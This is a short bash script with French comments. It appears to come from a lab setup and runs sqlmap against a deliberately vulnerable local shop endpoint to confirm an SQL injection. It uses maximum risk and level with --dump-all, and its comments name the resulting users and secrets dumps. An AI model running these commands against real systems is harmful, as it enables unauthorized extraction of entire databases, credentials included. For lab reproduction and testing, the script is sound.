#!/usr/bin/env bash
# Validation par outil tiers pour prouver la reproductibilité

TARGET="http://localhost:3000/api/vulnerable/search?category=informatique"

sqlmap -u "$TARGET" \
  --batch \
  --level=5 \
  --risk=3 \
  --technique=UBET \
  --dbms=mysql \
  --dump-all \
  --threads=4 \
  --output-dir=./sqlmap-output

# Après exploitation :
#   sqlmap-output/<host>/dump/shop_vulnerable/users.csv
#   sqlmap-output/<host>/dump/shop_vulnerable/secrets.csv